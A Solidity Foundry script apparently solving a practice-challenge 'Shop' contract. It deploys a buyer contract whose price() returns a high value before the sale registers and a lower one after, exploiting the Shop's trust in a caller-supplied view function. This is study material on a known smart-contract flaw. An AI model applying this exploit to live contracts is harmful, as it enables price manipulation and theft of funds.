// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract BuyerContract {
    Shop constant shopInstance =
        Shop(0x58aa86e0DC31a619BF6312fda702e018147fE2a5);
    uint256 fakePrice = 50;
    uint256 realPrice = 100;

    function price() external view returns (uint) {
        if (shopInstance.isSold()) {
            return fakePrice;
        } else {
            return realPrice;
        }
    }

    function buyItem() external {
        shopInstance.buy();
    }
}

contract ShopSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        BuyerContract buyer = new BuyerContract();
        buyer.buyItem();
        vm.stopBroadcast();
    }
}
